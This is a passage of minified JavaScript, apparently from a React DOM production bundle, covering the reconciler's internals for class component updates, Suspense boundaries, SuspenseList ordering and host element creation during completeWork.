        var s = t.value;
        n.payload = function() {
            return r(s)
        }
        ,
        n.callback = function() {
            Pi(e, t)
        }
    }
    var i = e.stateNode;
    return i !== null && typeof i.componentDidCatch == "function" && (n.callback = function() {
        Pi(e, t),
        typeof r != "function" && (Mt === null ? Mt = new Set([this]) : Mt.add(this));
        var o = t.stack;
        this.componentDidCatch(t.value, {
            componentStack: o !== null ? o : ""
        })
    }
    ),
    n
}
function Jl(e, t, n) {
    var r = e.pingCache;
    if (r === null) {
        r = e.pingCache = new Pp;
        var s = new Set;
        r.set(t, s)
    } else
        s = r.get(t),
        s === void 0 && (s = new Set,
        r.set(t, s));
    s.has(n) || (s.add(n),
    e = Kp.bind(null, e, t, n),
    t.then(e, e))
}
function Ql(e) {
    do {
        var t;
        if ((t = e.tag === 13) && (t = e.memoizedState,
        t = t !== null ? t.dehydrated !== null : !0),
        t)
            return e;
        e = e.return
    } while (e !== null);
    return null
}
function Zl(e, t, n, r, s) {
    return e.mode & 1 ? (e.flags |= 65536,
    e.lanes = s,
    e) : (e === t ? e.flags |= 65536 : (e.flags |= 128,
    n.flags |= 131072,
    n.flags &= -52805,
    n.tag === 1 && (n.alternate === null ? n.tag = 17 : (t = gt(-1, 1),
    t.tag = 2,
    Rt(n, t, 1))),
    n.lanes |= 1),
    e)
}
var $p = bt.ReactCurrentOwner
  , Ce = !1;
function Ne(e, t, n, r) {
    t.child = e === null ? od(t, null, n, r) : zn(t, e.child, n, r)
}
function Xl(e, t, n, r, s) {
    n = n.render;
    var i = t.ref;
    return An(t, s),
    r = $o(e, t, n, r, i, s),
    n = Eo(),
    e !== null && !Ce ? (t.updateQueue = e.updateQueue,
    t.flags &= -2053,
    e.lanes &= ~s,
    wt(e, t, s)) : (te && n && yo(t),
    t.flags |= 1,
    Ne(e, t, r, s),
    t.child)
}
function ec(e, t, n, r, s) {
    if (e === null) {
        var i = n.type;
        return typeof i == "function" && !Oo(i) && i.defaultProps === void 0 && n.compare === null && n.defaultProps === void 0 ? (t.tag = 15,
        t.type = i,
        Id(e, t, i, r, s)) : (e = Sr(n.type, null, r, t, t.mode, s),
        e.ref = t.ref,
        e.return = t,
        t.child = e)
    }
    if (i = e.child,
    !(e.lanes & s)) {
        var o = i.memoizedProps;
        if (n = n.compare,
        n = n !== null ? n : ja,
        n(o, r) && e.ref === t.ref)
            return wt(e, t, s)
    }
    return t.flags |= 1,
    e = zt(i, r),
    e.ref = t.ref,
    e.return = t,
    t.child = e
}
function Id(e, t, n, r, s) {
    if (e !== null) {
        var i = e.memoizedProps;
        if (ja(i, r) && e.ref === t.ref)
            if (Ce = !1,
            t.pendingProps = r = i,
            (e.lanes & s) !== 0)
                e.flags & 131072 && (Ce = !0);
            else
                return t.lanes = e.lanes,
                wt(e, t, s)
    }
    return $i(e, t, n, r, s)
}
function Dd(e, t, n) {
    var r = t.pendingProps
      , s = r.children
      , i = e !== null ? e.memoizedState : null;
    if (r.mode === "hidden")
        if (!(t.mode & 1))
            t.memoizedState = {
                baseLanes: 0,
                cachePool: null,
                transitions: null
            },
            Z(Bn, De),
            De |= n;
        else {
            if (!(n & 1073741824))
                return e = i !== null ? i.baseLanes | n : n,
                t.lanes = t.childLanes = 1073741824,
                t.memoizedState = {
                    baseLanes: e,
                    cachePool: null,
                    transitions: null
                },
                t.updateQueue = null,
                Z(Bn, De),
                De |= e,
                null;
            t.memoizedState = {
                baseLanes: 0,
                cachePool: null,
                transitions: null
            },
            r = i !== null ? i.baseLanes : n,
            Z(Bn, De),
            De |= r
        }
    else
        i !== null ? (r = i.baseLanes | n,
        t.memoizedState = null) : r = n,
        Z(Bn, De),
        De |= r;
    return Ne(e, t, s, n),
    t.child
}
function Rd(e, t) {
    var n = t.ref;
    (e === null && n !== null || e !== null && e.ref !== n) && (t.flags |= 512,
    t.flags |= 2097152)
}
function $i(e, t, n, r, s) {
    var i = $e(n) ? tn : we.current;
    return i = Mn(t, i),
    An(t, s),
    n = $o(e, t, n, r, i, s),
    r = Eo(),
    e !== null && !Ce ? (t.updateQueue = e.updateQueue,
    t.flags &= -2053,
    e.lanes &= ~s,
    wt(e, t, s)) : (te && r && yo(t),
    t.flags |= 1,
    Ne(e, t, n, s),
    t.child)
}
function tc(e, t, n, r, s) {
    if ($e(n)) {
        var i = !0;
        Ir(t)
    } else
        i = !1;
    if (An(t, s),
    t.stateNode === null)
        gr(e, t),
        $d(t, n, r),
        Ci(t, n, r, s),
        r = !0;
    else if (e === null) {
        var o = t.stateNode
          , l = t.memoizedProps;
        o.props = l;
        var u = o.context
          , c = n.contextType;
        typeof c == "object" && c !== null ? c = Ge(c) : (c = $e(n) ? tn : we.current,
        c = Mn(t, c));
        var m = n.getDerivedStateFromProps
          , h = typeof m == "function" || typeof o.getSnapshotBeforeUpdate == "function";
        h || typeof o.UNSAFE_componentWillReceiveProps != "function" && typeof o.componentWillReceiveProps != "function" || (l !== r || u !== c) && Yl(t, o, r, c),
        Bt = !1;
        var x = t.memoizedState;
        o.state = x,
        zr(t, r, o, s),
        u = t.memoizedState,
        l !== r || x !== u || Pe.current || Bt ? (typeof m == "function" && (Ti(t, n, m, r),
        u = t.memoizedState),
        (l = Bt || ql(t, n, l, r, x, u, c)) ? (h || typeof o.UNSAFE_componentWillMount != "function" && typeof o.componentWillMount != "function" || (typeof o.componentWillMount == "function" && o.componentWillMount(),
        typeof o.UNSAFE_componentWillMount == "function" && o.UNSAFE_componentWillMount()),
        typeof o.componentDidMount == "function" && (t.flags |= 4194308)) : (typeof o.componentDidMount == "function" && (t.flags |= 4194308),
        t.memoizedProps = r,
        t.memoizedState = u),
        o.props = r,
        o.state = u,
        o.context = c,
        r = l) : (typeof o.componentDidMount == "function" && (t.flags |= 4194308),
        r = !1)
    } else {
        o = t.stateNode,
        cd(e, t),
        l = t.memoizedProps,
        c = t.type === t.elementType ? l : Je(t.type, l),
        o.props = c,
        h = t.pendingProps,
        x = o.context,
        u = n.contextType,
        typeof u == "object" && u !== null ? u = Ge(u) : (u = $e(n) ? tn : we.current,
        u = Mn(t, u));
        var y = n.getDerivedStateFromProps;
        (m = typeof y == "function" || typeof o.getSnapshotBeforeUpdate == "function") || typeof o.UNSAFE_componentWillReceiveProps != "function" && typeof o.componentWillReceiveProps != "function" || (l !== h || x !== u) && Yl(t, o, r, u),
        Bt = !1,
        x = t.memoizedState,
        o.state = x,
        zr(t, r, o, s);
        var v = t.memoizedState;
        l !== h || x !== v || Pe.current || Bt ? (typeof y == "function" && (Ti(t, n, y, r),
        v = t.memoizedState),
        (c = Bt || ql(t, n, c, r, x, v, u) || !1) ? (m || typeof o.UNSAFE_componentWillUpdate != "function" && typeof o.componentWillUpdate != "function" || (typeof o.componentWillUpdate == "function" && o.componentWillUpdate(r, v, u),
        typeof o.UNSAFE_componentWillUpdate == "function" && o.UNSAFE_componentWillUpdate(r, v, u)),
        typeof o.componentDidUpdate == "function" && (t.flags |= 4),
        typeof o.getSnapshotBeforeUpdate == "function" && (t.flags |= 1024)) : (typeof o.componentDidUpdate != "function" || l === e.memoizedProps && x === e.memoizedState || (t.flags |= 4),
        typeof o.getSnapshotBeforeUpdate != "function" || l === e.memoizedProps && x === e.memoizedState || (t.flags |= 1024),
        t.memoizedProps = r,
        t.memoizedState = v),
        o.props = r,
        o.state = v,
        o.context = u,
        r = c) : (typeof o.componentDidUpdate != "function" || l === e.memoizedProps && x === e.memoizedState || (t.flags |= 4),
        typeof o.getSnapshotBeforeUpdate != "function" || l === e.memoizedProps && x === e.memoizedState || (t.flags |= 1024),
        r = !1)
    }
    return Ei(e, t, n, r, i, s)
}
function Ei(e, t, n, r, s, i) {
    Rd(e, t);
    var o = (t.flags & 128) !== 0;
    if (!r && !o)
        return s && Ll(t, n, !1),
        wt(e, t, i);
    r = t.stateNode,
    $p.current = t;
    var l = o && typeof n.getDerivedStateFromError != "function" ? null : r.render();
    return t.flags |= 1,
    e !== null && o ? (t.child = zn(t, e.child, null, i),
    t.child = zn(t, null, l, i)) : Ne(e, t, l, i),
    t.memoizedState = r.state,
    s && Ll(t, n, !0),
    t.child
}
function Md(e) {
    var t = e.stateNode;
    t.pendingContext ? Wl(e, t.pendingContext, t.pendingContext !== t.context) : t.context && Wl(e, t.context, !1),
    Bo(e, t.containerInfo)
}
function nc(e, t, n, r, s) {
    return Un(),
    So(s),
    t.flags |= 256,
    Ne(e, t, n, r),
    t.child
}
var Ai = {
    dehydrated: null,
    treeContext: null,
    retryLane: 0
};
function Ii(e) {
    return {
        baseLanes: e,
        cachePool: null,
        transitions: null
    }
}
function Ud(e, t, n) {
    var r = t.pendingProps, s = ne.current, i = !1, o = (t.flags & 128) !== 0, l;
    if ((l = o) || (l = e !== null && e.memoizedState === null ? !1 : (s & 2) !== 0),
    l ? (i = !0,
    t.flags &= -129) : (e === null || e.memoizedState !== null) && (s |= 1),
    Z(ne, s & 1),
    e === null)
        return ji(t),
        e = t.memoizedState,
        e !== null && (e = e.dehydrated,
        e !== null) ? (t.mode & 1 ? e.data === "$!" ? t.lanes = 8 : t.lanes = 1073741824 : t.lanes = 1,
        null) : (o = r.children,
        e = r.fallback,
        i ? (r = t.mode,
        i = t.child,
        o = {
            mode: "hidden",
            children: o
        },
        !(r & 1) && i !== null ? (i.childLanes = 0,
        i.pendingProps = o) : i = cs(o, r, 0, null),
        e = Xt(e, r, n, null),
        i.return = t,
        e.return = t,
        i.sibling = e,
        t.child = i,
        t.child.memoizedState = Ii(n),
        t.memoizedState = Ai,
        e) : Do(t, o));
    if (s = e.memoizedState,
    s !== null && (l = s.dehydrated,
    l !== null))
        return Ep(e, t, o, r, l, s, n);
    if (i) {
        i = r.fallback,
        o = t.mode,
        s = e.child,
        l = s.sibling;
        var u = {
            mode: "hidden",
            children: r.children
        };
        return !(o & 1) && t.child !== s ? (r = t.child,
        r.childLanes = 0,
        r.pendingProps = u,
        t.deletions = null) : (r = zt(s, u),
        r.subtreeFlags = s.subtreeFlags & 14680064),
        l !== null ? i = zt(l, i) : (i = Xt(i, o, n, null),
        i.flags |= 2),
        i.return = t,
        r.return = t,
        r.sibling = i,
        t.child = r,
        r = i,
        i = t.child,
        o = e.child.memoizedState,
        o = o === null ? Ii(n) : {
            baseLanes: o.baseLanes | n,
            cachePool: null,
            transitions: o.transitions
        },
        i.memoizedState = o,
        i.childLanes = e.childLanes & ~n,
        t.memoizedState = Ai,
        r
    }
    return i = e.child,
    e = i.sibling,
    r = zt(i, {
        mode: "visible",
        children: r.children
    }),
    !(t.mode & 1) && (r.lanes = n),
    r.return = t,
    r.sibling = null,
    e !== null && (n = t.deletions,
    n === null ? (t.deletions = [e],
    t.flags |= 16) : n.push(e)),
    t.child = r,
    t.memoizedState = null,
    r
}
function Do(e, t) {
    return t = cs({
        mode: "visible",
        children: t
    }, e.mode, 0, null),
    t.return = e,
    e.child = t
}
function nr(e, t, n, r) {
    return r !== null && So(r),
    zn(t, e.child, null, n),
    e = Do(t, t.pendingProps.children),
    e.flags |= 2,
    t.memoizedState = null,
    e
}
function Ep(e, t, n, r, s, i, o) {
    if (n)
        return t.flags & 256 ? (t.flags &= -257,
        r = Fs(Error(C(422))),
        nr(e, t, o, r)) : t.memoizedState !== null ? (t.child = e.child,
        t.flags |= 128,
        null) : (i = r.fallback,
        s = t.mode,
        r = cs({
            mode: "visible",
            children: r.children
        }, s, 0, null),
        i = Xt(i, s, o, null),
        i.flags |= 2,
        r.return = t,
        i.return = t,
        r.sibling = i,
        t.child = r,
        t.mode & 1 && zn(t, e.child, null, o),
        t.child.memoizedState = Ii(o),
        t.memoizedState = Ai,
        i);
    if (!(t.mode & 1))
        return nr(e, t, o, null);
    if (s.data === "$!") {
        if (r = s.nextSibling && s.nextSibling.dataset,
        r)
            var l = r.dgst;
        return r = l,
        i = Error(C(419)),
        r = Fs(i, r, void 0),
        nr(e, t, o, r)
    }
    if (l = (o & e.childLanes) !== 0,
    Ce || l) {
        if (r = me,
        r !== null) {
            switch (o & -o) {
            case 4:
                s = 2;
                break;
            case 16:
                s = 8;
                break;
            case 64:
            case 128:
            case 256:
            case 512:
            case 1024:
            case 2048:
            case 4096:
            case 8192:
            case 16384:
            case 32768:
            case 65536:
            case 131072:
            case 262144:
            case 524288:
            case 1048576:
            case 2097152:
            case 4194304:
            case 8388608:
            case 16777216:
            case 33554432:
            case 67108864:
                s = 32;
                break;
            case 536870912:
                s = 268435456;
                break;
            default:
                s = 0
            }
            s = s & (r.suspendedLanes | o) ? 0 : s,
            s !== 0 && s !== i.retryLane && (i.retryLane = s,
            St(e, s),
            et(r, e, s, -1))
        }
        return Lo(),
        r = Fs(Error(C(421))),
        nr(e, t, o, r)
    }
    return s.data === "$?" ? (t.flags |= 128,
    t.child = e.child,
    t = _p.bind(null, e),
    s._reactRetry = t,
    null) : (e = i.treeContext,
    Re = Dt(s.nextSibling),
    Ue = t,
    te = !0,
    Ze = null,
    e !== null && (Ke[_e++] = ft,
    Ke[_e++] = xt,
    Ke[_e++] = nn,
    ft = e.id,
    xt = e.overflow,
    nn = t),
    t = Do(t, r.children),
    t.flags |= 4096,
    t)
}
function ac(e, t, n) {
    e.lanes |= t;
    var r = e.alternate;
    r !== null && (r.lanes |= t),
    Bi(e.return, t, n)
}
function Ks(e, t, n, r, s) {
    var i = e.memoizedState;
    i === null ? e.memoizedState = {
        isBackwards: t,
        rendering: null,
        renderingStartTime: 0,
        last: r,
        tail: n,
        tailMode: s
    } : (i.isBackwards = t,
    i.rendering = null,
    i.renderingStartTime = 0,
    i.last = r,
    i.tail = n,
    i.tailMode = s)
}
function zd(e, t, n) {
    var r = t.pendingProps
      , s = r.revealOrder
      , i = r.tail;
    if (Ne(e, t, r.children, n),
    r = ne.current,
    r & 2)
        r = r & 1 | 2,
        t.flags |= 128;
    else {
        if (e !== null && e.flags & 128)
            e: for (e = t.child; e !== null; ) {
                if (e.tag === 13)
                    e.memoizedState !== null && ac(e, n, t);
                else if (e.tag === 19)
                    ac(e, n, t);
                else if (e.child !== null) {
                    e.child.return = e,
                    e = e.child;
                    continue
                }
                if (e === t)
                    break e;
                for (; e.sibling === null; ) {
                    if (e.return === null || e.return === t)
                        break e;
                    e = e.return
                }
                e.sibling.return = e.return,
                e = e.sibling
            }
        r &= 1
    }
    if (Z(ne, r),
    !(t.mode & 1))
        t.memoizedState = null;
    else
        switch (s) {
        case "forwards":
            for (n = t.child,
            s = null; n !== null; )
                e = n.alternate,
                e !== null && Wr(e) === null && (s = n),
                n = n.sibling;
            n = s,
            n === null ? (s = t.child,
            t.child = null) : (s = n.sibling,
            n.sibling = null),
            Ks(t, !1, s, n, i);
            break;
        case "backwards":
            for (n = null,
            s = t.child,
            t.child = null; s !== null; ) {
                if (e = s.alternate,
                e !== null && Wr(e) === null) {
                    t.child = s;
                    break
                }
                e = s.sibling,
                s.sibling = n,
                n = s,
                s = e
            }
            Ks(t, !0, n, null, i);
            break;
        case "together":
            Ks(t, !1, null, null, void 0);
            break;
        default:
            t.memoizedState = null
        }
    return t.child
}
function gr(e, t) {
    !(t.mode & 1) && e !== null && (e.alternate = null,
    t.alternate = null,
    t.flags |= 2)
}
function wt(e, t, n) {
    if (e !== null && (t.dependencies = e.dependencies),
    rn |= t.lanes,
    !(n & t.childLanes))
        return null;
    if (e !== null && t.child !== e.child)
        throw Error(C(153));
    if (t.child !== null) {
        for (e = t.child,
        n = zt(e, e.pendingProps),
        t.child = n,
        n.return = t; e.sibling !== null; )
            e = e.sibling,
            n = n.sibling = zt(e, e.pendingProps),
            n.return = t;
        n.sibling = null
    }
    return t.child
}
function Ap(e, t, n) {
    switch (t.tag) {
    case 3:
        Md(t),
        Un();
        break;
    case 5:
        ud(t);
        break;
    case 1:
        $e(t.type) && Ir(t);
        break;
    case 4:
        Bo(t, t.stateNode.containerInfo);
        break;
    case 10:
        var r = t.type._context
          , s = t.memoizedProps.value;
        Z(Mr, r._currentValue),
        r._currentValue = s;
        break;
    case 13:
        if (r = t.memoizedState,
        r !== null)
            return r.dehydrated !== null ? (Z(ne, ne.current & 1),
            t.flags |= 128,
            null) : n & t.child.childLanes ? Ud(e, t, n) : (Z(ne, ne.current & 1),
            e = wt(e, t, n),
            e !== null ? e.sibling : null);
        Z(ne, ne.current & 1);
        break;
    case 19:
        if (r = (n & t.childLanes) !== 0,
        e.flags & 128) {
            if (r)
                return zd(e, t, n);
            t.flags |= 128
        }
        if (s = t.memoizedState,
        s !== null && (s.rendering = null,
        s.tail = null,
        s.lastEffect = null),
        Z(ne, ne.current),
        r)
            break;
        return null;
    case 22:
    case 23:
        return t.lanes = 0,
        Dd(e, t, n)
    }
    return wt(e, t, n)
}
var Wd, Di, Ld, Od;
Wd = function(e, t) {
    for (var n = t.child; n !== null; ) {
        if (n.tag === 5 || n.tag === 6)
            e.appendChild(n.stateNode);
        else if (n.tag !== 4 && n.child !== null) {
            n.child.return = n,
            n = n.child;
            continue
        }
        if (n === t)
            break;
        for (; n.sibling === null; ) {
            if (n.return === null || n.return === t)
                return;
            n = n.return
        }
        n.sibling.return = n.return,
        n = n.sibling
    }
}
;
Di = function() {}
;
Ld = function(e, t, n, r) {
    var s = e.memoizedProps;
    if (s !== r) {
        e = t.stateNode,
        Jt(ut.current);
        var i = null;
        switch (n) {
        case "input":
            s = ni(e, s),
            r = ni(e, r),
            i = [];
            break;
        case "select":
            s = re({}, s, {
                value: void 0
            }),
            r = re({}, r, {
                value: void 0
            }),
            i = [];
            break;
        case "textarea":
            s = si(e, s),
            r = si(e, r),
            i = [];
            break;
        default:
            typeof s.onClick != "function" && typeof r.onClick == "function" && (e.onclick = Er)
        }
        oi(n, r);
        var o;
        n = null;
        for (c in s)
            if (!r.hasOwnProperty(c) && s.hasOwnProperty(c) && s[c] != null)
                if (c === "style") {
                    var l = s[c];
                    for (o in l)
                        l.hasOwnProperty(o) && (n || (n = {}),
                        n[o] = "")
                } else
                    c !== "dangerouslySetInnerHTML" && c !== "children" && c !== "suppressContentEditableWarning" && c !== "suppressHydrationWarning" && c !== "autoFocus" && (ya.hasOwnProperty(c) ? i || (i = []) : (i = i || []).push(c, null));
        for (c in r) {
            var u = r[c];
            if (l = s != null ? s[c] : void 0,
            r.hasOwnProperty(c) && u !== l && (u != null || l != null))
                if (c === "style")
                    if (l) {
                        for (o in l)
                            !l.hasOwnProperty(o) || u && u.hasOwnProperty(o) || (n || (n = {}),
                            n[o] = "");
                        for (o in u)
                            u.hasOwnProperty(o) && l[o] !== u[o] && (n || (n = {}),
                            n[o] = u[o])
                    } else
                        n || (i || (i = []),
                        i.push(c, n)),
                        n = u;
                else
                    c === "dangerouslySetInnerHTML" ? (u = u ? u.__html : void 0,
                    l = l ? l.__html : void 0,
                    u != null && l !== u && (i = i || []).push(c, u)) : c === "children" ? typeof u != "string" && typeof u != "number" || (i = i || []).push(c, "" + u) : c !== "suppressContentEditableWarning" && c !== "suppressHydrationWarning" && (ya.hasOwnProperty(c) ? (u != null && c === "onScroll" && X("scroll", e),
                    i || l === u || (i = [])) : (i = i || []).push(c, u))
        }
        n && (i = i || []).push("style", n);
        var c = i;
        (t.updateQueue = c) && (t.flags |= 4)
    }
}
;
Od = function(e, t, n, r) {
    n !== r && (t.flags |= 4)
}
;
function Xn(e, t) {
    if (!te)
        switch (e.tailMode) {
        case "hidden":
            t = e.tail;
            for (var n = null; t !== null; )
                t.alternate !== null && (n = t),
                t = t.sibling;
            n === null ? e.tail = null : n.sibling = null;
            break;
        case "collapsed":
            n = e.tail;
            for (var r = null; n !== null; )
                n.alternate !== null && (r = n),
                n = n.sibling;
            r === null ? t || e.tail === null ? e.tail = null : e.tail.sibling = null : r.sibling = null
        }
}
function ve(e) {
    var t = e.alternate !== null && e.alternate.child === e.child
      , n = 0
      , r = 0;
    if (t)
        for (var s = e.child; s !== null; )
            n |= s.lanes | s.childLanes,
            r |= s.subtreeFlags & 14680064,
            r |= s.flags & 14680064,
            s.return = e,
            s = s.sibling;
    else
        for (s = e.child; s !== null; )
            n |= s.lanes | s.childLanes,
            r |= s.subtreeFlags,
            r |= s.flags,
            s.return = e,
            s = s.sibling;
    return e.subtreeFlags |= r,
    e.childLanes = n,
    t
}
function Ip(e, t, n) {
    var r = t.pendingProps;
    switch (vo(t),
    t.tag) {
    case 2:
    case 16:
    case 15:
    case 0:
    case 11:
    case 7:
    case 8:
    case 12:
    case 9:
    case 14:
        return ve(t),
        null;
    case 1:
        return $e(t.type) && Ar(),
        ve(t),
        null;
    case 3:
        return r = t.stateNode,
        Wn(),
        ee(Pe),
        ee(we),
        Co(),
        r.pendingContext && (r.context = r.pendingContext,
        r.pendingContext = null),
        (e === null || e.child === null) && (er(t) ? t.flags |= 4 : e === null || e.memoizedState.isDehydrated && !(t.flags & 256) || (t.flags |= 1024,
        Ze !== null && (Fi(Ze),
        Ze = null))),
        Di(e, t),
        ve(t),
        null;
    case 5:
        To(t);
        var s = Jt($a.current);
        if (n = t.type,
        e !== null && t.stateNode != null)
            Ld(e, t, n, r, s),
            e.ref !== t.ref && (t.flags |= 512,
            t.flags |= 2097152);
        else {
            if (!r) {
                if (t.stateNode === null)
                    throw Error(C(166));
                return ve(t),
                null
            }
            if (e = Jt(ut.current),
            er(t)) {
                r = t.stateNode,
                n = t.type;
                var i = t.memoizedProps;
                switch (r[ot] = t,
                r[Ca] = i,
                e = (t.mode & 1) !== 0,
                n) {
                case "dialog":
                    X("cancel", r),
                    X("close", r);
                    break;
                case "iframe":
                case "object":
                case "embed":
                    X("load", r);
                    break;
                case "video":
                case "audio":
                    for (s = 0; s < ia.length; s++)
                        X(ia[s], r);
                    break;
                case "source":
                    X("error", r);
                    break;
                case "img":
                case "image":
                case "link":
                    X("error", r),
                    X("load", r);
                    break;
                case "details":
                    X("toggle", r);
                    break;
                case "input":
                    ml(r, i),
                    X("invalid", r);
                    break;
                case "select":
                    r._wrapperState = {
                        wasMultiple: !!i.multiple
                    },
                    X("invalid", r);
                    break;
                case "textarea":
                    pl(r, i),
                    X("invalid", r)
                }
                oi(n, i),
                s = null;
                for (var o in i)
                    if (i.hasOwnProperty(o)) {
                        var l = i[o];
                        o === "children" ? typeof l == "string" ? r.textContent !== l && (i.suppressHydrationWarning !== !0 && Xa(r.textContent, l, e),
                        s = ["children", l]) : typeof l == "number" && r.textContent !== "" + l && (i.suppressHydrationWarning !== !0 && Xa(r.textContent, l, e),
                        s = ["children", "" + l]) : ya.hasOwnProperty(o) && l != null && o === "onScroll" && X("scroll", r)
                    }
                switch (n) {
                case "input":
                    Va(r),
                    hl(r, i, !0);
                    break;
                case "textarea":
                    Va(r),
                    fl(r);
                    break;
                case "select":
                case "option":
                    break;
                default:
                    typeof i.onClick == "function" && (r.onclick = Er)
                }
                r = s,
                t.updateQueue = r,
                r !== null && (t.flags |= 4)
            } else {
                o = s.nodeType === 9 ? s : s.ownerDocument,
                e === "http://www.w3.org/1999/xhtml" && (e = fu(n)),
                e === "http://www.w3.org/1999/xhtml" ? n === "script" ? (e = o.createElement("div"),
                e.innerHTML = "<script><\/script>",
                e = e.removeChild(e.firstChild)) : typeof r.is == "string" ? e = o.createElement(n, {
                    is: r.is
                }) : (e = o.createElement(n),
                n === "select" && (o = e,
                r.multiple ? o.multiple = !0 : r.size && (o.size = r.size))) : e = o.createElementNS(e, n),
                e[ot] = t,
                e[Ca] = r,
                Wd(e, t, !1, !1),
                t.stateNode = e;
                e: {
                    switch (o = li(n, r),
                    n) {
                    case "dialog":
                        X("cancel", e),
                        X("close", e),
                        s = r;
                        break;
                    case "iframe":
                    case "object":
                    case "embed":
                        X("load", e),
                        s = r;
                        break;
                    case "video":
                    case "audio":
                        for (s = 0; s < ia.length; s++)
                            X(ia[s], e);
                        s = r;
                        break;
                    case "source":
                        X("error", e),
                        s = r;
                        break;
                    case "img":
                    case "image":
                    case "link":
                        X("error", e),
                        X("load", e),
                        s = r;
                        break;
                    case "details":
                        X("toggle", e),
                        s = r;
                        break;
                    case "input":
                        ml(e, r),
                        s = ni(e, r),
                        X("invalid", e);
                        break;
                    case "option":
                        s = r;
                        break;
                    case "select":
                        e._wrapperState = {
                            wasMultiple: !!r.multiple
                        },
                        s = re({}, r, {
                            value: void 0
                        }),
                        X("invalid", e);
                        break;
                    case "textarea":
                        pl(e, r),
                        s = si(e, r),
                        X("invalid", e);
                        break;
                    default:
                        s = r
                    }
                    oi(n, s),
                    l = s;
                    for (i in l)
                        if (l.hasOwnProperty(i)) {
                            var u = l[i];
                            i === "style" ? yu(e, u) : i === "dangerouslySetInnerHTML" ? (u = u ? u.__html : void 0,
                            u != null && xu(e, u)) : i === "children" ? typeof u == "string" ? (n !== "textarea" || u !== "") && va(e, u) : typeof u == "number" && va(e, "" + u) : i !== "suppressContentEditableWarning" && i !== "suppressHydrationWarning" && i !== "autoFocus" && (ya.hasOwnProperty(i) ? u != null && i === "onScroll" && X("scroll", e) : u != null && ao(e, i, u, o))
                        }
                    switch (n) {
                    case "input":
                        Va(e),
                        hl(e, r, !1);
                        break;
                    case "textarea":
                        Va(e),
                        fl(e);
                        break;
                    case "option":
                        r.value != null && e.setAttribute("value", "" + Wt(r.value));
                        break;
                    case "select":
                        e.multiple = !!r.multiple,
                        i = r.value,
                        i != null ? Cn(e, !!r.multiple, i, !1) : r.defaultValue != null && Cn(e, !!r.multiple, r.defaultValue, !0);
                        break;
                    default:
                        typeof s.onClick == "function" && (e.onclick = Er)
                    }
                    switch (n) {
                    case "button":
                    case "input":
                    case "select":
                    case "textarea":
                        r = !!r.autoFocus;
                        break e;
                    case "img":
                        r = !0;
                        break e;
                    default:
                        r = !1
                    }
                }
                r && (t.flags |= 4)
            }
            t.ref !== null && (t.flags |= 512,
            t.flags |= 2097152)
        }
        return ve(t),
        null;
    case 6:
        if (e && t.stateNode != null)
            Od(e, t, e.memoizedProps, r);
        else {
            if (typeof r != "string" && t.stateNode === null)
                throw Error(C(166));
            if (n = Jt($a.current),
            Jt(ut.current),
            er(t)) {
                if (r = t.stateNode,
                n = t.memoizedProps,
                r[ot] = t,
                (i = r.nodeValue !== n) && (e = Ue,
                e !== null))
                    switch (e.tag) {
                    case 3:
                        Xa(r.nodeValue, n, (e.mode & 1) !== 0);
                        break;
                    case 5:
                        e.memoizedProps.suppressHydrationWarning !== !0 && Xa(r.nodeValue, n, (e.mode & 1) !== 0)
                    }
                i && (t.flags |= 4)
            } else
                r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r),
                r[ot] = t,
                t.stateNode = r
        }
        return ve(t),
        null;
    case 13:
        if (ee(ne),
        r = t.memoizedState,
        e === null || e.memoizedState !== null && e.memoizedState.dehydrated !== null) {
            if (te && Re !== null && t.mode & 1 && !(t.flags & 128))
                sd(),
                Un(),
                t.flags |= 98560,
                i = !1;
            else if (i = er(t),
            r !== null && r.dehydrated !== null) {
                if (e === null) {
                    if (!i)
                        throw Error(C(318));
                    if (i = t.memoizedState,
                    i = i !== null ? i.dehydrated : null,
                    !i)
                        throw Error(C(317));
                    i[ot] = t
                } else
                    Un(),
                    !(t.flags & 128) && (t.memoizedState = null),
                    t.flags |= 4;
                ve(t),
                i = !1
            } else
                Ze !== null && (Fi(Ze),
                Ze = null),
                i = !0;
            if (!i)
                return t.flags & 65536 ? t : null
        }
        return t.flags & 128 ? (t.lanes = n,
        t) : (r = r !== null,
        r !== (e !== null && e.memoizedState !== null) && r && (t.child.flags |= 8192,
        t.mode & 1 && (e === null || ne.current & 1 ? ue === 0 && (ue = 3) : Lo())),
        t.updateQueue !== null && (t.flags |= 4),
        ve(t),
        null);
    case 4:
        return Wn(),
        Di(e, t),
        e === null && Ba(t.stateNode.containerInfo),
        ve(t),
        null;
    case 10:
        return No(t.type._context),
        ve(t),
        null;
    case 17:
        return $e(t.type) && Ar(),
        ve(t),
        null;
    case 19:
        if (ee(ne),
        i = t.memoizedState,
        i === null)
            return ve(t),
            null;
        if (r = (t.flags & 128) !== 0,
        o = i.rendering,
        o === null)
            if (r)
                Xn(i, !1);
            else {
                if (ue !== 0 || e !== null && e.flags & 128)
                    for (e = t.child; e !== null; ) {
                        if (o = Wr(e),
                        o !== null) {
                            for (t.flags |= 128,
                            Xn(i, !1),
                            r = o.updateQueue,
                            r !== null && (t.updateQueue = r,
                            t.flags |= 4),
                            t.subtreeFlags = 0,
                            r = n,
                            n = t.child; n !== null; )
                                i = n,
                                e = r,
                                i.flags &= 14680066,
                                o = i.alternate,
                                o === null ? (i.childLanes = 0,
                                i.lanes = e,
                                i.child = null,
                                i.subtreeFlags = 0,
                                i.memoizedProps = null,
                                i.memoizedState = null,
                                i.updateQueue = null,
                                i.dependencies = null,
                                i.stateNode = null) : (i.childLanes = o.childLanes,
                                i.lanes = o.lanes,
                                i.child = o.child,
                                i.subtreeFlags = 0,
                                i.deletions = null,
                                i.memoizedProps = o.memoizedProps,
                                i.memoizedState = o.memoizedState,
                                i.updateQueue = o.updateQueue,
                                i.type = o.type,
                                e = o.dependencies,
                                i.dependencies = e === null ? null : {
                                    lanes: e.lanes,
                                    firstContext: e.firstContext
                                }),
                                n = n.sibling;
                            return Z(ne, ne.current & 1 | 2),
                            t.child
                        }
                        e = e.sibling
                    }
                i.tail !== null && ie() > On && (t.flags |= 128,
                r = !0,
                Xn(i, !1),
                t.lanes = 4194304)
            }
        else {
            if (!r)
                if (e = Wr(o),
                e !== null) {
                    if (t.flags |= 128,
                    r = !0,
                    n = e.updateQueue,
                    n !== null && (t.updateQueue = n,
                    t.flags |= 4),
                    Xn(i, !0),
                    i.tail === null && i.tailMode === "hidden" && !o.alternate && !te)
                        return ve(t),
                        null
                } else
                    2 * ie() - i.renderingStartTime > On && n !== 1073741824 && (t.flags |= 128,
                    r = !0,
                    Xn(i, !1),
